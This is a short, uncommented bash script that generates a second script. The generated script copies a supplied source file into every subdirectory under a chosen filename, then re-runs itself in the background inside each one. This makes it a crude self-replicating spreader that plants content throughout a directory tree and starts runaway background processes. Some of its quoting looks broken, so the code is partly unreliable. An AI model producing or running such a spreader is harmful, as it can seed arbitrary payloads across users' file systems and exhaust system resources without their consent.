#!/bin/bash

if (($# != 2)); then
    echo "Usage: $(basename $0) path_to_src write_to_file"
    exit
fi

src=$(cat $1)
filename=$2

cat << PROGRAM
for file in \"$(ls)"; do
    if [ -d \$file ]; then
	cat <<EOF > \$file/$filename 
$src 
EOF
	if ((\$# == 0)); then
            pwd=\$(pwd)
	    (cd \$file; exec \$pwd/\$(basename \$0) \$pwd)&
	else
	    (cd \$file; exec \$1/\$(basename \$0) \$1)&
	fi
    fi
done
exit
PROGRAM


	
